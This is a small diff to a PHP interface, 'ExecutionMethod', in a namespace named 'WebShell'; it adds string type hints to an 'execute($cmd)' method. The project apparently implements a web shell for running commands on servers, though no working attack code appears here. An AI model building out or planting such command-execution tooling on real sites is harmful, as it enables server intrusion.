@@ -3,6 +3,6 @@ namespace WebShell;
 
 interface ExecutionMethod
 {
-    public function execute($cmd);
+    public function execute(string $cmd): string;
 }
 ?>
